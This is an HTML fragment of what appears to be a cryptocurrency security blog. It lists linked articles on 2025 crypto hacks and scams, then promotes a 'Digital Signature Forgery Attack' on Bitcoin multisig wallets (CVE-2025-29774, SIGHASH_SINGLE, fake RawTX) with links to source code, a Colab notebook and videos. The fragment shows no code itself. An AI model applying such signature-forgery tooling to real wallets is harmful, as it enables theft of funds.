<li><em><a href="https://darkai.ru/the-insidiousness-of-cyber-threats-how-fake-cold-wallets-and-malicious-drivers-are-emptying-crypto-assets-and-what-to-do-to-protect-yourself/"><strong>The Insidiousness of Cyber ​​Threats: How Fake Cold Wallets and Malicious Drivers</strong></a> Are Emptying Crypto Assets and What to Do to Protect Yourself</em>: <em>Cryptanalysis of Bitcoin Asset Drainage: Exposing the Menace of Fake Cold Wallets and Malicious Drivers in 2025’s Cyber Threat Landscape</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/alex-protocol-strengthens-security-and-restores-user-trust-via-usdc-stable-compensation-following-major-exploit/">Alex Protocol Strengthens Security and Restores User Trust via USDC Stable</a></strong> Compensation Following Major Exploit</em>: <em>Cryptanalysis of the Alex Protocol Bitcoin DeFi Exploit: Dissecting the $8.3 Million Self-Listing Verification Breach and Restoring Trust through USDC Compensation</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/bybit-after-1-4-billion-hack-comprehensive-security-update-liquidity-restoration-and-new-cyber-attack-challenges-in-2025/">Bybit After $1.4 Billion Hack: Comprehensive Security Update, Liquidity Restoration</a></strong>, and New Cyber ​​Attack Challenges Cryptanalysis of the Historic $1.4 Billion Bybit Hack: Unraveling Sophisticated Cold Wallet Exploits, North Korean Attack Vectors, and the 2025 Security Overhaul</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/social-engineering-in-2025-the-main-vector-of-attacks-on-cryptocurrency-and-modern-methods-of-protection-and-how-the-human-factor-became-the-weak-link-of-crypto-security/">Social Engineering in 2025: The Main Vector of Attacks on Cryptocurrency</a></strong> and Modern Methods of Protection and How the Human Factor Became the Weak Link of Crypto Security</em>: <em>Cryptanalysis of the Human Factor: Unveiling Social Engineering as the Dominant Attack Vector in 2025’s Bitcoin Blockchain Security Landscape</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/lazarus-group-vulnerabilities-revealed-how-hacker-mistakes-and-security-measures-help-counter-north-korean-group-cyberattacks/">Lazarus Group Vulnerabilities Revealed: How Hacker Mistakes and Security Measures</a></strong> Help Counter North Korean Group Cyberattacks</em>: <em>Cryptanalysis of State-Sponsored Cyber Warfare: Unmasking Lazarus Group’s $1.5 Billion Bybit Heist and the Evolution of North Korean Cyberattack Countermeasures</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/cryptocurrency-hack-losses-decline-in-may-2025-causes-large-scale-attacks-and-impact-of-north-korea-cyber-threats-on-global-security-and-industry-trust/">Cryptocurrency Hack Losses Decline in May 2025: Causes, Large-Scale Attacks</a></strong>, and Impact of North Korea Cyber ​​Threats on Global Security and Industry Trust</em>: <em>Cryptanalysis of 2025 Bitcoin Blockchain Attacks: Exploring the Decline in Hack Losses Amid North Korean Threats and Their Impact on Global Crypto Security and Industry Trust</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/rise-of-crypto-scams-in-2025-how-lack-of-knowledge-and-social-engineering-make-users-easy-targets/">Rise of Crypto Scams in 2025: How Lack of Knowledge and Social Engineering</a></strong> Make Users Easy Targets</em>: <em>Cryptanalysis of the Bitcoin Blockchain in 2025: How User Vulnerability and Advanced Social Engineering Fuel the Surge in Crypto Scams</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/12-million-cork-protocol-hack-wsteth-market-vulnerability-security-measures-and-refund-prospects-defi-under-attack-wsteth-market-vulnerability-and-refund-challenges-under-new-law/">$12 Million Cork Protocol Hack: wstETH Market Vulnerability, Security Measures</a></strong>, and Refund Prospects. DeFi Under Attack, wstETH Market Vulnerability, and Refund Challenges Under New Law</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/the-cetus-hack-and-lessons-for-web3-msb-vulnerabilities-criticism-of-centralized-interference-and-new-security-standards-with-multi-sig-wallets/">The Cetus Hack and Lessons for Web3: MSB Vulnerabilities, Criticism of Centralized Interference</a></strong>, and New Security Standards with Multi-Sig Wallets</em>: <em>Cryptanalysis of the Cetus Protocol Hack: Exposing MSB Vulnerabilities, Centralization Critiques, and the Push for Multi-Sig Security Standards in Web3</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/cyberattacks-on-ledger-users-on-the-rise-how-fake-apps-and-seed-theft-are-undermining-trust-in-crypto-wallets-and-what-to-do-to-protect-yourself/">Cyberattacks on Ledger users on the rise: How fake apps and seed theft are undermining trust</a></strong> in crypto wallets and what to do to protect yourself</em>: <em>Cryptanalysis of Bitcoin Wallet Security in 2025: The Rising Threat of Fake Apps and Seed Theft Undermining User Trust and Defenses</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://darkai.ru/220-million-cetus-hack-security-challenges-sui-validators-response-and-lessons-for-trust-in-web3-ecosystems/"><strong>$220 Million Cetus Hack: Security Challenges, Sui Validators’ Response, and Lessons for Trust</strong></a> in Web3 Ecosystems</em>: <em>Cryptanalysis of the $223 Million Cetus Hack: Unveiling Overflow Vulnerabilities, Sui Validators’ Crisis Response, and Implications for Trust in Web3 Ecosystems</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/massive-coinbase-data-leak-causes-consequences-and-new-standards-for-cybersecurity-in-the-crypto-industry/">Massive Coinbase Data Leak: Causes, Consequences, and New Standards for Cybersecurity</a></strong> in the Crypto Industry</em>: <em>Cryptanalysis of the 2025 Coinbase Data Breach: Insider Threats, Social Engineering Exploits, and Advancing Cybersecurity Standards in the Crypto Industry</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/social-engineering-and-crypto-fraud-unique-threats-to-coinbase-and-the-need-for-a-unified-defense/">Social Engineering and Crypto Fraud: Unique Threats to Coinbase</a></strong> and the Need for a Unified Defense</em>: <em>Cryptanalysis of the 2025 Coinbase Data Breach: Social Engineering as the Ultimate Crypto Security Vulnerability and the Quest for Unified Defense</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/safeheron-brings-new-levels-of-web3-security-and-privacy-the-first-open-intel-sgx-tee-framework-for-ethereum-and-decentralized-finance/">Safeheron Brings New Levels of Web3 Security and Privacy:</a> </strong>The First Open Intel SGX TEE Framework for Ethereum and Decentralized Finance: Advancing Bitcoin Blockchain Cryptanalysis with Safeheron’s Open-Source Intel SGX TEE Framework: Pioneering Web3 Security and Privacy in Decentralized Finance</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://darkai.ru/cyber-threats-in-defi-how-standards-vulnerabilities-social-engineering-and-mixers-like-tornado-cash-are-undermining-crypto-platform-security-and-user-trust/"><strong>Cyber ​​Threats in DeFi: How Standards Vulnerabilities, Social Engineering</strong></a>, and Mixers Like Tornado Cash Are Undermining Crypto Platform Security and User Trust: Cryptanalysis of Decentralized Finance Vulnerabilities: A Deep Dive into Standard Exploits, Social Engineering, and the Role of Crypto Mixers in Undermining Bitcoin Ecosystem Security</em></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://dzen.ru/video/watch/68801dfc0c886621f7c1a0db"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-44.png" alt="Digital Signature Forgery Attack: как уязвимости CVE-2025-29774 и баг SIGHASH_SINGLE угрожают мультиподписным кошелькам методы операции с поддельными RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>This material was created for the&nbsp;&nbsp;<a href="https://cryptodeeptech.ru/">CRYPTO DEEP TECH</a>&nbsp;portal &nbsp;to ensure financial data security and cryptography on elliptic curves&nbsp;&nbsp;<a href="https://www.youtube.com/@cryptodeeptech">secp256k1</a>&nbsp;&nbsp;against weak&nbsp;&nbsp;<a href="https://github.com/demining/CryptoDeepTools">ECDSA</a>&nbsp;signatures &nbsp;in the&nbsp;&nbsp;<a href="https://t.me/cryptodeeptech">BITCOIN</a>&nbsp;cryptocurrency . The creators of the software are not responsible for the use of materials.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/41DigitalSignatureForgeryAttack">Source code</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://darkai.ru/">Crypto Tools</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://colab.research.google.com/drive/1TKrJ0bKsNgc72H9UvzpCnh2YPmRsyPdW"><strong></strong></a><a href="https://colab.research.google.com/drive/1TKrJ0bKsNgc72H9UvzpCnh2YPmRsyPdW">Google Colab</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech">Telegram: https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/qbu1m_C1wyA">Video: https://youtu.be/qbu1m_C1wyA</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://dzen.ru/video/watch/68801dfc0c886621f7c1a0db">Video tutorial: https://dzen.ru/video/watch/68801dfc0c886621f7c1a0db</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeeptech.ru/digital-signature-forgery-attack">Source: https://cryptodeeptech.ru/digital-signature-forgery-attack</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/063-1-1024x576.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/063-1-1024x576.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->
